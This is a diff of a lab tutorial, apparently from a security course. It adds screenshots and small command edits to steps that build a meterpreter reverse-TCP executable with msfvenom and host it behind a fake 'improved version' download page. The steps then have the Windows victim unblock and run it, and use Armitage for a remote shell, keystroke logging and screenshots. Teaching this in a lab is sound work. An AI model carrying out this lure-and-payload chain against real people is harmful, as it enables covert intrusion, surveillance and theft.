@@ -174,11 +174,15 @@ In this lab we show the use of the Social Engineering Toolkit (SET), Metasploit,
     ```
     sudo msfvenom -l payloads | grep windows | grep reverse_tcp
     ```
+![alt text](image-17.png)   
+We will be using the one that is highlighted   
 
 2. Then run the following command to create a reverse TCP payload, which will generate a metPayload.exe payload and place it in the Apache web server directory:
     ```
-    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.4 LPORT=444 -f exe -o /var/www/html/metPayload.exe
-    ```
+    sudo msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.4 LPORT=444 -f exe -o /var/www/html/metPayload.exe
+    ```     
+![alt text](image-18.png)   
+
 3. Navigate to the Apache web server directory:
     ```
     cd /var/www/html
@@ -194,6 +198,9 @@ In this lab we show the use of the Social Engineering Toolkit (SET), Metasploit,
     <p>THIS IS AN IMPROVED VERSION</p>
     <a href="metPayload.exe">Download the improved version</a>
     ```
+![alt text](image-19.png)    
+
+
 6. Save and exit Vim, Press ESC, then type :wq and press Enter.
 
 ##### 3.2 Start Armitage
@@ -201,8 +208,12 @@ In this lab we show the use of the Social Engineering Toolkit (SET), Metasploit,
     ```
     sudo armitage
     ```
-2. In the Armitage window, click `Connect`.
-3. If a message appears stating Metasploit server is not running, click `Yes` to start it.
+2. In the Armitage window, click `Connect`.   
+![alt text](image-20.png)   
+
+3. If a message appears stating Metasploit server is not running, click `Yes` to start it.   
+![alt text](image-21.png)   
+
 4. If a database connection error occurs:
     - Open a terminal and run:
     ```
@@ -212,25 +223,36 @@ In this lab we show the use of the Social Engineering Toolkit (SET), Metasploit,
    
 ##### 3.3 Set Up the Exploit in Armitage   
 1. In the upper-left panel, navigate to:
-   - Windows -> x64 -> Meterpreter -> reverse_tcp.
+   - Payload -> Windows -> x64 -> Meterpreter -> reverse_tcp.
 2. Double-click on `reverse_tcp`.
 3. Set the following parameters:
    - LHOST: 192.168.56.4
-   - LPORT: 444
+   - LPORT: 444 
+![alt text](image-22.png)    
+
 4. Click `Launch` to start the exploit.
 
 ##### 3.4 Execute the Payload on the Windows Machine
 1. On the Windows 8.1 machine:
    -  Open a web browser and navigate to http://192.168.56.4.
-2. Download the improved version (metPayload.exe).
+2. Download the improved version (metPayload.exe).   
+
+![alt text](image-23.png)    
+
 3. Locate the downloaded file, right-click it, and select Properties.
 4. In the Properties window:
-    - Click Unblock, then Apply, and OK.
+    - Click Unblock, then Apply, and OK.   
+![alt text](image-24.png)    
+
 5. Run the metPayload.exe file.
 
 ##### 3.5 Interact with the Compromised Machine
-1. In Armitage, a new session will appear representing the compromised machine.
-2. Right-click the session and select Interact -> Meterpreter Shell.
+1. In Armitage, a new session will appear representing the compromised machine.    
+![alt text](image-25.png)    
+
+2. Right-click the session and select Interact -> Meterpreter Shell.    
+![alt text](image-26.png)    
+
 3. Run commands in the shell:
     - List files in the current directory:
         ```
@@ -238,12 +260,25 @@ In this lab we show the use of the Social Engineering Toolkit (SET), Metasploit,
         ```
    - Explore running processes:
         ```
-        wmic process list brief
-        ```
+        ps
+        ```    
+
+  ![alt text](image-28.png)
+
 ##### 3.6 Post-Exploitation Options
-1. Right-click the session and explore additional options:
+1. Right-click the session and explore additional options:    
+
+![alt text](image-29.png)    
+
     - Log Keystrokes: Capture keystrokes.
-    - Take Screenshots: Take screenshots of the target machine.
+![alt text](image-31.png)    
+![alt text](image-30.png)
+
+
+    - Take Screenshots: Take screenshots of the target machine.      
+![alt text](image-32.png)     
+
+
 2. Explore files and data as required.
 
 
